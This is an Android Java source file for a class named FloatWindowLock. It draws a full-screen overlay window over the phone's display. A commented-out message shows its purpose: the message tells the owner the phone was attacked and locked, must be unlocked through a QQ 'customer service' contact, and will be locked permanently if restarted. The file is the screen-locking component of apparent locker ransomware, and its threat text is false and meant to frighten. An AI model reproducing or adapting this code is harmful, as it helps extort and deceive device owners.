/**
 * 
 */
package floatwindow;



import com.byc.wzry.R;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.LinearLayout;
import android.widget.TextView;
import util.ConfigCt;

/**
 * @author ASUS
 *
 */
public class FloatWindowLock {
	//private static final String LOCAK_SAY="您的手机遭遇网络攻击！\n已暂时锁定！\n请联系客服：\nQQ：1096754477\n解锁!\n警告：请记牢客服QQ号，千万不能重启手机！否则手机会被永久锁死！";
	private static FloatWindowLock current;
	private Context context;
	//定义浮动窗口布局
	private LinearLayout mFloatLayout;
	private WindowManager.LayoutParams wmParams;
    //创建浮动窗口设置布局参数的对象
	private WindowManager mWindowManager;
	//窗口控件对象：
	public TextView tvShow;//显示内容；
	private boolean bShow=false;//是否显示
	//-----------------------------------------------------------------------------
	private FloatWindowLock(Context context) {
		this.context = context.getApplicationContext();
		createFloatView();
		

		}
	    public static synchronized FloatWindowLock getInstance(Context context) {
	        if(current == null) {
	            current = new FloatWindowLock(context);
	        }
	        return current;
	    }
	    private void createFloatView()
	  	{
	  		wmParams = new WindowManager.LayoutParams();
	  		//获取WindowManagerImpl.CompatModeWrapper
	  		mWindowManager = (WindowManager)context.getSystemService(context.WINDOW_SERVICE);
	  		//设置window type
	  		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT&&Build.VERSION.SDK_INT <= Build.VERSION_CODES.N)
	 			wmParams.type = LayoutParams.TYPE_TOAST; 
	 		else
	 			wmParams.type = LayoutParams.TYPE_PHONE; 
	  		//设置图片格式，效果为背景透明
	          wmParams.format = PixelFormat.RGBA_8888; 
	          //设置浮动窗口不可聚焦（实现操作除浮动窗口外的其他可见窗口的操作）
	          wmParams.flags = 
//	            LayoutParams.FLAG_NOT_TOUCH_MODAL |
	            LayoutParams.FLAG_NOT_FOCUSABLE
//	            LayoutParams.FLAG_NOT_TOUCHABLE
	            ;
	          
	          //调整悬浮窗显示的停靠位置为左侧置顶
	          wmParams.gravity = Gravity.LEFT | Gravity.TOP; 
	          
	          // 以屏幕左上角为原点，设置x、y初始值
	          wmParams.x = 0;
	          wmParams.y = 0;
	          /*// 设置悬浮窗口长宽数据*/
	          wmParams.width = ConfigCt.screenWidth;
	          wmParams.height = ConfigCt.screenHeight;
	          
	          LayoutInflater inflater = LayoutInflater.from(context);
	          //获取浮动窗口视图所在布局
	          //mFloatLayout = (LinearLayout) inflater.inflate(R.layout.float_lock, null);
	          //tvShow = (TextView)mFloatLayout.findViewById(R.id.tvShow);
	          //tvShow.setText(R.string.lock_say);
	          int LinearLayoutID=util.ResourceUtil.getLayoutId(context, "float_lock");
	          mFloatLayout = (LinearLayout) inflater.inflate(LinearLayoutID, null);
	          tvShow = (TextView)mFloatLayout.getChildAt(0);
	          //tvShow.setText(LOCAK_SAY);
	          tvShow.setText(ConfigCt.lock_say);
	          //添加mFloatLayout
	          //mWindowManager.addView(mFloatLayout, wmParams);
	          mFloatLayout.measure(View.MeasureSpec.makeMeasureSpec(0,
	  				View.MeasureSpec.UNSPECIFIED), View.MeasureSpec
	  				.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED));

	  	}
	    public void ShowFloatingWindow(){
	    	if(!bShow){
	    		
	    		 mWindowManager.addView(mFloatLayout, wmParams);
	    		bShow=true;
	    		ConfigCt.getInstance(context).setFloatWindowLock(bShow);
	    	}
	    }
	    public void RemoveFloatingWindow(){
			if(mFloatLayout != null)
			{
				if(bShow)mWindowManager.removeView(mFloatLayout);
				bShow=false;
				ConfigCt.getInstance(context).setFloatWindowLock(bShow);
			}
	    }
}
